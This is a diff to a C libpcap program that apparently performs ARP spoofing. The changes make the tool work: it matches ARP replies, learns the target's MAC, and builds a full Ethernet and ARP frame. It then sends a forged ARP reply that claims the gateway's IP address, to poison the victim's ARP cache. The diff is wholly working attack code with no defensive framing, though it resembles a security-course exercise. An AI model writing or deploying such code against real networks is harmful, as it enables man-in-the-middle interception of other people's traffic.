@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <pcap.h>
 #include <stdint.h>
 #include <arpa/inet.h>
@@ -174,19 +175,18 @@ int main(int argc, char* argv[]) {
 	memset(packet, 0, sizeof(eth_size+arp_size));
 	while (1) {
 		int res = pcap_next_ex(handle, &header, ((const u_char**)&packet));
-		//printf("res:%d\n", res);
 		if (res < 0) break;
 		if (res == 0) continue;
 		recv_eth_hdr = (struct eth_header*) packet;
 		recv_arp_hdr = (struct arp_header*) (packet + 14);
-		if (ntohs(recv_eth_hdr->type) != ETHERTYPE_ARP) {
+		if (ntohs(recv_eth_hdr->type) == ETHERTYPE_ARP) {
 			if (recv_arp_hdr->sender_ip == arp_hdr->target_ip) {
 				printf("ARP Reply============================================\n");
 				print_packet(recv_eth_hdr, recv_arp_hdr);
 				printf("=====================================================\n");
 				printf("TARGET MAC: ");
 				for(int i=0; i<6; i++) {
-					arp_hdr->target_mac[i] = recv_eth_hdr->src_mac[i];
+					eth_hdr->dest_mac[i] = arp_hdr->target_mac[i] = recv_eth_hdr->src_mac[i];
 					printf("%02x ", recv_eth_hdr->src_mac[i]);
 				}
 				printf("TARGET IP: %04x\n", recv_arp_hdr->sender_ip);
@@ -194,7 +194,11 @@ int main(int argc, char* argv[]) {
 				arp_hdr->target_ip = recv_arp_hdr->sender_ip;
 				arp_hdr->sender_ip = ((recv_arp_hdr->sender_ip & 0x00FFFFFF)) | 0x01000000; // to gateway addr
 				arp_hdr->opcode = htons(REPLY);
-				if (pcap_sendpacket(handle, (const u_char*)arp_hdr, sizeof(arp_hdr)) == -1) {
+				memset(packet, 0, eth_size+arp_size);
+				memcpy(packet, eth_hdr, eth_size);
+				memcpy(packet+14, arp_hdr, arp_size);
+				sleep(3);
+				if (pcap_sendpacket(handle, (const u_char*)packet, eth_size+arp_size) == -1) {
 					printf("ARP Spoofing Failure\n");
 				} else {
 					printf("ARP Spoofing Success!!\n");
